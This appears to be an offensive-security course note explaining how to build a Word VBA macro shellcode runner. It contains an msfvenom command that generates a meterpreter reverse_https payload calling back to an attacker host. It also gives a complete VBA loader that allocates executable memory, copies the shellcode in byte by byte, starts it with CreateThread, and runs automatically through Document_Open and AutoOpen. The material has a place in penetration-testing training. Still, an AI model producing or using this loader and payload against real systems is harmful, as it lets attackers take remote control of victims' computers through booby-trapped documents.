# 02.03 VBA Macro Shellcode Runner

> Listing 50 · 32-bit meterpreter, byte-by-byte RtlMoveMemory loop

## Overview

Word 2016 installs as 32-bit. Declare three Win32 APIs as PtrSafe, store shellcode in a Variant array, allocate RWX memory with VirtualAlloc, copy byte-by-byte via a For loop through RtlMoveMemory, then fire CreateThread. Document_Open and AutoOpen both trigger on open.

## Steps

- **Generate 32-bit shellcode** — `msfvenom -p windows/meterpreter/reverse_https ... -f vbapplication`.
- **Declare Win32 APIs** — three PtrSafe Declare statements for VirtualAlloc, RtlMoveMemory, CreateThread.
- **Store in Variant array** — `buf = Array(...)` from msfvenom vbapplication output.
- **VirtualAlloc RWX page** — `addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)`.
- **Copy byte-by-byte** — For counter loop: `data = buf(counter); RtlMoveMemory(addr + counter, data, 1)`.
- **CreateThread** — `res = CreateThread(0, 0, addr, 0, 0, 0)`.
- **Both triggers** — `Sub Document_Open` and `Sub AutoOpen` both call `MyMacro`.

## Commands

### msfvenom — 32-bit VBA shellcode

```bash
# Word 2016 is 32-bit — use windows/meterpreter not windows/x64/meterpreter
msfvenom -p windows/meterpreter/reverse_https LHOST=<LHOST> LPORT=443 \
  EXITFUNC=thread -f vbapplication -o sc.vba
```

### VBA loader (textbook Listing 50)

```vba
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Sub Document_Open(): MyMacro: End Sub
Sub AutoOpen():      MyMacro: End Sub

Function MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    buf = Array(232, 130, 0, 0, 0)  ' paste msfvenom -f vbapplication output here
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function
```
